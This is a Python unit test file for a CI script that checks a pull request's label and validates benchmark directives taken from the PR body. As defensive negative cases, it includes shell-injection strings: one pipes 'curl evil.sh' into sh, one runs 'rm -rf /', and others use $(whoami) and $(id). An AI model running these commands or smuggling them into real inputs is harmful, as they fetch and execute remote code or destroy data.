"""Unit tests for check_pr_label.py."""

import json
import sys
import tempfile
import unittest
from pathlib import Path
from unittest.mock import MagicMock, patch

from cloudbuild.benchmarks import check_pr_label


class TestCheckPrLabel(unittest.TestCase):

    def setUp(self):
        self.temp_dir = tempfile.TemporaryDirectory()
        self.skip_file = str(Path(self.temp_dir.name) / "SKIPPED")
        self.selection_file = str(Path(self.temp_dir.name) / "selection.env")

    def tearDown(self):
        self.temp_dir.cleanup()

    def _run_main(self, body):
        """Drive the real CLI entry point with a mocked GitHub response."""
        payload = json.dumps(
            {"labels": [{"name": "execute-perf-test"}], "body": body}
        ).encode("utf-8")
        mock_resp = MagicMock()
        mock_resp.read.return_value = payload
        argv = [
            "check_pr_label.py",
            "--pr=123",
            "--label=execute-perf-test",
            f"--skip-file={self.skip_file}",
            f"--selection-file={self.selection_file}",
        ]
        with patch("urllib.request.urlopen") as mock_urlopen:
            mock_urlopen.return_value.__enter__.return_value = mock_resp
            with patch.object(sys, "argv", argv):
                with self.assertRaises(SystemExit) as ctx:
                    check_pr_label.main()
        return ctx.exception.code

    @patch("urllib.request.urlopen")
    def test_pr_with_label_proceeds(self, mock_urlopen):
        mock_resp = MagicMock()
        mock_resp.read.return_value = json.dumps(
            {"labels": [{"name": "Execute-Perf-Test"}]}
        ).encode("utf-8")
        mock_urlopen.return_value.__enter__.return_value = mock_resp

        result = check_pr_label.check_pr_label(
            repo="fsspec/gcsfs",
            pr_number="123",
            required_label="execute-perf-test",
            skip_file=self.skip_file,
        )
        self.assertTrue(result)
        self.assertFalse(Path(self.skip_file).exists())

    @patch("urllib.request.urlopen")
    def test_pr_without_label_skips(self, mock_urlopen):
        mock_resp = MagicMock()
        mock_resp.read.return_value = json.dumps(
            {"labels": [{"name": "documentation"}]}
        ).encode("utf-8")
        mock_urlopen.return_value.__enter__.return_value = mock_resp

        result = check_pr_label.check_pr_label(
            repo="fsspec/gcsfs",
            pr_number="123",
            required_label="execute-perf-test",
            skip_file=self.skip_file,
        )
        self.assertFalse(result)
        self.assertTrue(Path(self.skip_file).exists())

    @patch("time.sleep")
    @patch("urllib.request.urlopen", side_effect=OSError("network down"))
    def test_api_failure_skips(self, mock_urlopen, mock_sleep):
        """An unverifiable label must not provision benchmark infrastructure."""
        result = check_pr_label.check_pr_label(
            repo="fsspec/gcsfs",
            pr_number="123",
            required_label="execute-perf-test",
            skip_file=self.skip_file,
        )
        self.assertFalse(result)
        self.assertTrue(Path(self.skip_file).exists())
        self.assertEqual(mock_urlopen.call_count, check_pr_label._MAX_ATTEMPTS)

    def test_invalid_directive_exits_nonzero(self):
        """A bad directive must fail the build step, not fall back to the default."""
        self.assertEqual(self._run_main("perf-groups: read; rm -rf /"), 1)
        self.assertFalse(Path(self.selection_file).exists())

    def test_valid_directive_exits_zero_and_writes_selection(self):
        self.assertEqual(self._run_main("perf-groups: read write"), 0)
        self.assertIn(
            "BENCHMARK_GROUPS='read write'",
            Path(self.selection_file).read_text(encoding="utf-8"),
        )


class TestParseSelection(unittest.TestCase):

    def test_parses_directives(self):
        body = (
            "Fixes a read regression.\n\n"
            "perf-groups: read write\n"
            "perf-scenarios: read_seq_fixed_duration, read_rand_fixed_duration\n"
            "perf-io-sizes: 1, 16\n"
        )
        self.assertEqual(
            check_pr_label.parse_selection(body),
            {
                "BENCHMARK_GROUPS": "read write",
                "BENCHMARK_CONFIG": "read_seq_fixed_duration,read_rand_fixed_duration",
                "CHUNK_SIZES_MB": "1,16",
            },
        )

    def test_changing_groups_clears_default_scenario_filter(self):
        """Otherwise the read-specific default filter matches nothing and collects 0 cases."""
        self.assertEqual(
            check_pr_label.parse_selection("perf-groups: write"),
            {"BENCHMARK_GROUPS": "write", "BENCHMARK_CONFIG": ""},
        )

    def test_no_directives_returns_empty(self):
        self.assertEqual(check_pr_label.parse_selection("Just a normal PR."), {})
        self.assertEqual(check_pr_label.parse_selection(""), {})

    def test_rejects_unknown_group(self):
        with self.assertRaises(ValueError):
            check_pr_label.parse_selection("perf-groups: read notagroup")

    def test_rejects_misspelled_scenario(self):
        """The runner matches names exactly, so a typo would silently run nothing."""
        with self.assertRaises(ValueError) as ctx:
            check_pr_label.parse_selection(
                "perf-scenarios: read_seq_fixed_duratoin", default_groups="read"
            )
        self.assertIn("read_seq_fixed_duration", str(ctx.exception))

    def test_rejects_scenario_outside_selected_groups(self):
        with self.assertRaises(ValueError) as ctx:
            check_pr_label.parse_selection(
                "perf-scenarios: write_seq_fixed_duration", default_groups="read"
            )
        self.assertIn("perf-groups: write", str(ctx.exception))

    def test_scenario_validated_against_groups_declared_later(self):
        """Directives are validated as a set, so their order in the body cannot matter."""
        self.assertEqual(
            check_pr_label.parse_selection(
                "perf-scenarios: write_seq_fixed_duration\nperf-groups: write",
                default_groups="read",
            ),
            {
                "BENCHMARK_GROUPS": "write",
                "BENCHMARK_CONFIG": "write_seq_fixed_duration",
            },
        )

    def test_catalog_lists_groups_with_their_scenarios(self):
        """--list is the only way a PR author can discover valid scenario names."""
        catalog = check_pr_label.format_catalog()
        self.assertIn("read", catalog)
        self.assertIn("read_seq_fixed_duration", catalog)

    def test_ignores_fenced_code_blocks(self):
        """Quoting the syntax to explain it must not change what the PR benchmarks."""
        body = "For example:\n```\nperf-groups: write\n```\nperf-groups: read"
        self.assertEqual(
            check_pr_label.parse_selection(body),
            {"BENCHMARK_GROUPS": "read", "BENCHMARK_CONFIG": ""},
        )

    def test_rejects_repeated_directive(self):
        with self.assertRaises(ValueError):
            check_pr_label.parse_selection("perf-groups: read\nperf-groups: write")

    def test_rejects_shell_metacharacters(self):
        """The PR body is attacker-controlled and lands in an ssh --command."""
        for body in (
            "perf-scenarios: read_seq'; curl evil.sh | sh; '",
            "perf-groups: read; rm -rf /",
            "perf-io-sizes: 1$(whoami)",
            "perf-scenarios: $(id)",
        ):
            with self.subTest(body=body), self.assertRaises(ValueError):
                check_pr_label.parse_selection(body)


if __name__ == "__main__":
    unittest.main()
